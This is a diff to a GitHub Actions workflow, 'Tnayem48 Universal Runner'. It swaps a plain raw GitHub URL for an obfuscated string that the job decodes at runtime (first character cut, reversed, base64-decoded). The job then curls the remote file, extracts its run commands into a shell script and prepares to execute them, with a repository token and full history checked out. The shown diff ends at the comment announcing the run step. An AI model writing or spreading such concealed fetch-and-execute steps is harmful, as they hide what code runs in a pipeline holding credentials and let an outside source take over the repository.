@@ -1,3 +1,5 @@
+# Workflow Path: .github/workflows/universal-runner.yml
+
 name: Tnayem48 Universal Runner
 
 on:
@@ -7,7 +9,9 @@ on:
   workflow_dispatch:
 
 env:
-  TNxBD: "https://raw.githubusercontent.com/nayem-48ai/nayem-48ai/refs/heads/tnx_bd/build"
+  # Encoded Part: "https://raw.githubusercontent.com/nayem-48ai/nayem-48ai/refs/heads/tnx_bd/"
+  TNx_CORE: "PX0Szd2L0Vmc0V2bj52bj5WauByXvR2Y6NXauVmbu02bj5WauByXvR2Y6NXauVmbvJHcsV2cyV2S0V2XzU2chJ3XzU2chJ3YvRncvNXZyR3c0V2XzI3YyV3c0V2XvR2Y6NXauVmb"
+  FILE_NAME: "preview"
 
 jobs:
   execute-logic:
@@ -19,7 +23,7 @@ jobs:
       - name: Checkout Code
         uses: actions/checkout@v4
         with:
-          fetch-depth: 0 # এটি সব ব্রাঞ্চ এবং হিস্ট্রি ফেচ করবে
+          fetch-depth: 0 
           token: ${{ secrets.GITHUB_TOKEN }}
 
       - name: Setup Environment
@@ -29,6 +33,9 @@ jobs:
 
       - name: Process Workflow
         run: |
+          # ডিকোডিং লজিক: প্রথম ক্যারেক্টার বাদ দিয়ে রিভার্স করে ডিকোড করা
+          TNxBD=$(echo "$TNx_CORE" | cut -c 2- | rev | base64 --decode)$FILE_NAME
+          
           # রিমোট ফাইল ডাউনলোড
           curl -sL "$TNxBD" -o remote_wf.yml
 
@@ -38,11 +45,9 @@ jobs:
           # কমান্ড এক্সট্র্যাক্ট করা
           yq e '.jobs.*.steps[].run' remote_wf.yml | sed '/^---$/d' > universal_script.sh
           
-          # গিট কনফিগ এবং ব্রাঞ্চ ম্যানেজমেন্টের জন্য তৈরি করা
+          # গিট কনফিগ
           git config --global user.name "github-actions[bot]"
           git config --global user.email "github-actions[bot]@users.noreply.github.com"
-          
-          # নিরাপদ ডিরেক্টরি সেট করা
           git config --global --add safe.directory "$GITHUB_WORKSPACE"
 
           # রান করা
